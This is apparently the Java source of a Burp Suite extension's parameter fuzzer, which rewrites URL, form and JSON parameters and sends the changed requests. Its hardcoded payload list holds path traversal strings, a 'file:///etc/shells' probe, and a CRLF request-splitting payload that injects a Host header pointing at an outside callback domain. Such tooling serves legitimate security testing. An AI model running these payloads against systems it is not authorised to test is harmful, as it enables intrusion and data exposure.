package pzfzr.fuzzer;

import java.util.*;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.regex.Pattern;
import java.net.URLEncoder;
import java.net.URLDecoder;
import java.nio.charset.StandardCharsets;
import static pzfzr.fuzzer.PayloadConstants.FIXED_8K_STRING;

import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.params.HttpParameter;
import burp.api.montoya.http.message.params.HttpParameterType;
import burp.api.montoya.http.message.params.ParsedHttpParameter;
import burp.api.montoya.MontoyaApi;
import burp.api.montoya.logging.Logging;
import pzfzr.model.ModifiedRequestResponse;
import pzfzr.model.RequestResponseSaver;
import pzfzr.model.TableModel;
import pzfzr.core.RateLimiter;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.node.*;

public class ParamFuzzer {
    private final AtomicInteger nextModifiedId;
    private final MontoyaApi api;
    private final TableModel tableModel;
    private final RequestResponseSaver requestResponseSaver;
    private final RateLimiter rateLimiter;
    private final Logging logging;
    private volatile boolean isShuttingDown = false;

    private static final ThreadLocal<Random> RANDOM = ThreadLocal.withInitial(Random::new);
    private static final String HASH_CHARS = "0123456789abcdefghijklmnopqrstuvwxyz";
    private static final int HASH_LENGTH = 5;

    private final ObjectMapper objectMapper = new ObjectMapper();

    /**
     * PayloadInfo类用于将payload和其别名绑定在一起
     */
    private static class PayloadInfo {
        final String payload;
        final String alias;

        PayloadInfo(String payload, String alias) {
            this.payload = payload;
            this.alias = alias;
        }
    }

    // Payload列表及其对应别名 - 直接定义，不使用循环
    private static final List<PayloadInfo> PAYLOAD_INFOS = Arrays.asList(
            new PayloadInfo("norandomx", "payload01"),
            new PayloadInfo("/{param}", "payload02"),
            new PayloadInfo("%2f{param}", "payload03"),
            new PayloadInfo("./{param}", "payload04"),
            new PayloadInfo("%2e%2f{param}", "payload05"),
            new PayloadInfo("{param}/../{param}", "payload06"),
            new PayloadInfo("{param}%2f..%2f{param}", "payload07"),
            new PayloadInfo("{param}&norandom=xx", "payload08"),
            new PayloadInfo("{param}%26norandom=xx", "payload09"),
            new PayloadInfo("{param}/", "payload10"),
            new PayloadInfo("{param}%2f", "payload11"),
            new PayloadInfo("{param_url_encoded}", "payload12"),
            new PayloadInfo("{param_double_url_encoded}", "payload13"),
            new PayloadInfo("{param}#", "payload14"),
            new PayloadInfo("{param}%23", "payload15"),
            new PayloadInfo("{param}?", "payload16"),
            new PayloadInfo("{param}%3f", "payload17"),
            new PayloadInfo("{param}/../../../../../../../", "payload18"),
            new PayloadInfo("{param}%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f", "payload19"),
            new PayloadInfo("{param}\\", "payload20"),
            new PayloadInfo("{param}\\..\\..\\", "payload21"),
            new PayloadInfo("{param}%5c..%5c..%5c", "payload22"),
            new PayloadInfo("{random_8000}", "payload23"),
            new PayloadInfo("{param}%20HTTP/1.1%0D%0AHost:%20{fuzz}.ngcf.wi11.fun%0D%0Ax2x:%20", "payload24"),
            new PayloadInfo("file:///etc/shells", "payload25")
    );

    public ParamFuzzer(MontoyaApi api, TableModel tableModel, RequestResponseSaver requestResponseSaver,
                       RateLimiter rateLimiter, AtomicInteger nextModifiedId) {
        this.api = api;
        this.tableModel = tableModel;
        this.requestResponseSaver = requestResponseSaver;
        this.rateLimiter = rateLimiter;
        this.logging = api.logging();
        this.nextModifiedId = nextModifiedId;
    }

    /**
     * 主方法，供其他类调用
     */
    public void processRequest(HttpRequest originalRequest, int messageId, String host) {
        if (isShuttingDown) {
            return;
        }

        try {
            // 首先测试URL参数
            fuzzUrlParameters(originalRequest, messageId, host);

            // 然后测试POST body参数
            fuzzPostBodyParameters(originalRequest, messageId, host);

            // 最后测试JSON参数
            fuzzJsonParameters(originalRequest, messageId, host);

        } catch (Exception e) {
            // 按照ValueReplacer模式进行静默错误处理
        }
    }

    /**
     * 对URL参数进行模糊测试
     */
    private void fuzzUrlParameters(HttpRequest originalRequest, int messageId, String host) {
        if (isShuttingDown) return;

        List<ParsedHttpParameter> urlParams = originalRequest.parameters(HttpParameterType.URL);

        for (ParsedHttpParameter param : urlParams) {
            if (isShuttingDown) return;

            String paramName = param.name();
            String paramValue = param.value();

            for (PayloadInfo payloadInfo : PAYLOAD_INFOS) {
                if (isShuttingDown) return;

                // 根据需求#6，URL参数跳过random_8000
                if ("{random_8000}".equals(payloadInfo.payload)) {
                    continue;
                }

                String processedPayload = processPayload(payloadInfo.payload, paramValue);
                String expression = paramName + "=" + processedPayload;

                try {
                    HttpParameter newParam = HttpParameter.urlParameter(paramName, processedPayload);
                    HttpRequest modifiedRequest = originalRequest.withUpdatedParameters(newParam);

                    sendTestRequest(modifiedRequest, messageId, host, expression, "URL_PARAM",
                            payloadInfo.alias, paramName);

                } catch (Exception e) {
                    // 静默错误处理
                }
            }
        }
    }

    /**
     * 对POST body参数进行模糊测试（表单数据）
     */
    private void fuzzPostBodyParameters(HttpRequest originalRequest, int messageId, String host) {
        if (isShuttingDown) return;

        List<ParsedHttpParameter> bodyParams = originalRequest.parameters(HttpParameterType.BODY);

        for (ParsedHttpParameter param : bodyParams) {
            if (isShuttingDown) return;

            String paramName = param.name();
            String paramValue = param.value();

            for (PayloadInfo payloadInfo : PAYLOAD_INFOS) {
                if (isShuttingDown) return;

                String processedPayload = processPayload(payloadInfo.payload, paramValue);
                String expression = paramName + "=" + processedPayload;

                try {
                    HttpParameter newParam = HttpParameter.bodyParameter(paramName, processedPayload);
                    HttpRequest modifiedRequest = originalRequest.withUpdatedParameters(newParam);

                    sendTestRequest(modifiedRequest, messageId, host, expression, "BODY_PARAM",
                            payloadInfo.alias, paramName);

                } catch (Exception e) {
                    // 静默错误处理
                }
            }
        }
    }

    /**
     * 对JSON参数进行模糊测试
     */
    private void fuzzJsonParameters(HttpRequest originalRequest, int messageId, String host) {
        if (isShuttingDown) return;

        String bodyString = originalRequest.bodyToString();
        if (bodyString == null || bodyString.trim().isEmpty()) {
            return;
        }

        // 检查body是否为JSON格式（需求#14 - 不依赖content type）
        if (!isJsonFormat(bodyString)) {
            return;
        }

        try {
            JsonNode rootNode = objectMapper.readTree(bodyString);
            List<JsonPath> jsonPaths = extractJsonPaths(rootNode, "");

            for (JsonPath jsonPath : jsonPaths) {
                if (isShuttingDown) return;

                for (PayloadInfo payloadInfo : PAYLOAD_INFOS) {
                    if (isShuttingDown) return;

                    // 从JsonNode获取实际文本值
                    String originalValue = getJsonNodeValue(jsonPath.value);
                    String processedPayload = processPayload(payloadInfo.payload, originalValue);

                    try {
                        JsonNode modifiedJson = modifyJsonNode(rootNode, jsonPath.path, processedPayload);
                        String modifiedJsonString = objectMapper.writeValueAsString(modifiedJson);

                        // 从修改后的JSON中提取实际表达式
                        String expression = extractExpressionFromJson(modifiedJson, jsonPath.path, jsonPath.lastKey);

                        HttpRequest modifiedRequest = originalRequest.withBody(modifiedJsonString);

                        sendTestRequest(modifiedRequest, messageId, host, expression, "JSON_PARAM",
                                payloadInfo.alias, jsonPath.lastKey);

                    } catch (Exception e) {
                        // 静默错误处理
                    }
                }
            }

        } catch (Exception e) {
            // 静默错误处理
        }
    }

    /**
     * 从修改后的JSON中提取表达式以确保准确性
     */
    private String extractExpressionFromJson(JsonNode modifiedJson, String path, String lastKey) {
        try {
            String[] pathParts = path.split("\\.");
            JsonNode currentNode = modifiedJson;

            // 导航到父节点
            for (int i = 0; i < pathParts.length - 1; i++) {
                String part = pathParts[i];
                if (part.contains("[")) {
                    String arrayField = part.substring(0, part.indexOf("["));
                    int arrayIndex = Integer.parseInt(part.substring(part.indexOf("[") + 1, part.indexOf("]")));
                    currentNode = currentNode.get(arrayField).get(arrayIndex);
                } else {
                    currentNode = currentNode.get(part);
                }
            }

            // 获取最后一部分并提取键值对
            String lastPart = pathParts[pathParts.length - 1];
            JsonNode valueNode;

            if (lastPart.contains("[")) {
                String arrayField = lastPart.substring(0, lastPart.indexOf("["));
                int arrayIndex = Integer.parseInt(lastPart.substring(lastPart.indexOf("[") + 1, lastPart.indexOf("]")));
                valueNode = currentNode.get(arrayField).get(arrayIndex);
            } else {
                valueNode = currentNode.get(lastPart);
            }

            // 将值转换为正确的JSON表示
            String jsonValue = objectMapper.writeValueAsString(valueNode);

            return "\"" + lastKey + "\":" + jsonValue;

        } catch (Exception e) {
            // 如果提取失败，回退到简单格式
            return "\"" + lastKey + "\":\"[error]\"";
        }
    }

    /**
     * 从JsonNode获取实际值，不带JSON格式化
     */
    private String getJsonNodeValue(JsonNode node) {
        if (node.isTextual()) {
            return node.asText();
        } else if (node.isNumber()) {
            return node.asText();
        } else if (node.isBoolean()) {
            return node.asText();
        } else if (node.isNull()) {
            return "null";
        } else {
            // 回退到字符串表示
            return node.asText();
        }
    }

    /**
     * 检查字符串是否为JSON格式
     */
    private boolean isJsonFormat(String text) {
        try {
            objectMapper.readTree(text);
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    /**
     * 提取JSON路径用于模糊测试
     */
    private List<JsonPath> extractJsonPaths(JsonNode node, String currentPath) {
        List<JsonPath> paths = new ArrayList<>();

        if (node.isObject()) {
            Iterator<Map.Entry<String, JsonNode>> fields = node.fields();
            while (fields.hasNext()) {
                Map.Entry<String, JsonNode> field = fields.next();
                String fieldName = field.getKey();
                JsonNode fieldValue = field.getValue();
                String newPath = currentPath.isEmpty() ? fieldName : currentPath + "." + fieldName;

                if (fieldValue.isObject()) {
                    // 不对对象值进行模糊测试，但递归进入其中
                    paths.addAll(extractJsonPaths(fieldValue, newPath));
                } else if (fieldValue.isArray()) {
                    // 根据需求只测试数组中的第一个项目
                    if (fieldValue.size() > 0) {
                        JsonNode firstItem = fieldValue.get(0);
                        String arrayPath = newPath + "[0]";
                        if (!firstItem.isObject()) {
                            paths.add(new JsonPath(arrayPath, firstItem, fieldName));
                        } else {
                            paths.addAll(extractJsonPaths(firstItem, arrayPath));
                        }
                    }
                } else {
                    // 对字符串、数字、布尔值、null值进行模糊测试
                    paths.add(new JsonPath(newPath, fieldValue, fieldName));
                }
            }
        }

        return paths;
    }

    /**
     * 在指定路径修改JSON节点
     */
    private JsonNode modifyJsonNode(JsonNode rootNode, String path, String newValue) throws Exception {
        ObjectNode rootCopy = rootNode.deepCopy();

        String[] pathParts = path.split("\\.");
        JsonNode currentNode = rootCopy;

        for (int i = 0; i < pathParts.length - 1; i++) {
            String part = pathParts[i];
            if (part.contains("[")) {
                String arrayField = part.substring(0, part.indexOf("["));
                int arrayIndex = Integer.parseInt(part.substring(part.indexOf("[") + 1, part.indexOf("]")));
                currentNode = currentNode.get(arrayField).get(arrayIndex);
            } else {
                currentNode = currentNode.get(part);
            }
        }

        String lastPart = pathParts[pathParts.length - 1];
        if (lastPart.contains("[")) {
            String arrayField = lastPart.substring(0, lastPart.indexOf("["));
            int arrayIndex = Integer.parseInt(lastPart.substring(lastPart.indexOf("[") + 1, lastPart.indexOf("]")));
            ((ArrayNode) currentNode.get(arrayField)).set(arrayIndex, new TextNode(newValue));
        } else {
            ((ObjectNode) currentNode).put(lastPart, newValue);
        }

        return rootCopy;
    }

    /**
     * 使用参数替换处理payload
     */
    private String processPayload(String payload, String paramValue) {
        String processed = payload;

        // 处理 8000 字符随机字符串
        if ("{random_8000}".equals(payload)) {
            return FIXED_8K_STRING;
        }
        // Handle special URL encoding cases
        if ("{param_url_encoded}".equals(payload)) {
            // 对参数进行单次URL编码（完全编码）
            processed = urlEncodeFullly(paramValue);
        } else if ("{param_double_url_encoded}".equals(payload)) {
            // 对参数进行双重URL编码（完全编码）
            String singleEncoded = urlEncodeFullly(paramValue);
            processed = urlEncodeFullly(singleEncoded);
        } else {
            // 将{param}替换为实际参数值
            processed = processed.replace("{param}", paramValue);
        }

        // 处理{fuzz}替换
        if (processed.contains("{fuzz}")) {
            char[] hash = new char[HASH_LENGTH];
            for (int i = 0; i < HASH_LENGTH; i++) {
                hash[i] = HASH_CHARS.charAt(RANDOM.get().nextInt(HASH_CHARS.length()));
            }
            processed = processed.replace("{fuzz}", new String(hash));
        }

        return processed;
    }

    /**
     * 完全URL编码字符串（编码所有字符）
     */
    private String urlEncodeFullly(String input) {
        StringBuilder result = new StringBuilder();
        byte[] bytes = input.getBytes(StandardCharsets.UTF_8);
        for (byte b : bytes) {
            result.append(String.format("%%%02x", b & 0xFF));
        }
        return result.toString();
    }

    /**
     * 按照KnownTest模式发送测试请求
     * 已更新以包含payloadAlias和parameterName
     */
    private void sendTestRequest(HttpRequest modifiedRequest, int messageId, String host,
                                 String expression, String testType, String payloadAlias, String parameterName) {
        try {
            rateLimiter.acquire(modifiedRequest.url() + modifiedRequest.method());

            HttpRequestResponse modifiedResponse = api.http().sendRequest(modifiedRequest);
            int tempID = nextModifiedId.getAndIncrement();

            ModifiedRequestResponse modifiedPair = new ModifiedRequestResponse(
                    tempID,
                    messageId,
                    "PARAM_FUZZ",
                    expression,
                    payloadAlias,      // payload别名
                    parameterName,      // 当前测试参数的名称
                    requestResponseSaver,
                    logging
            );

            tableModel.addModifiedEntry(modifiedPair);
            requestResponseSaver.saveModifiedRequest(modifiedRequest, tempID);
            requestResponseSaver.handleDelayedModifiedResponse(modifiedResponse, tempID);

        } catch (Exception e) {
            // 按照ValueReplacer模式进行静默错误处理
        }
    }

    /**
     * 设置关闭状态
     */
    public void setShuttingDown(boolean shuttingDown) {
        this.isShuttingDown = shuttingDown;
    }

    /**
     * 用于跟踪JSON路径的辅助类
     */
    private static class JsonPath {
        final String path;
        final JsonNode value;
        final String lastKey;

        JsonPath(String path, JsonNode value, String lastKey) {
            this.path = path;
            this.value = value;
            this.lastKey = lastKey;
        }
    }
}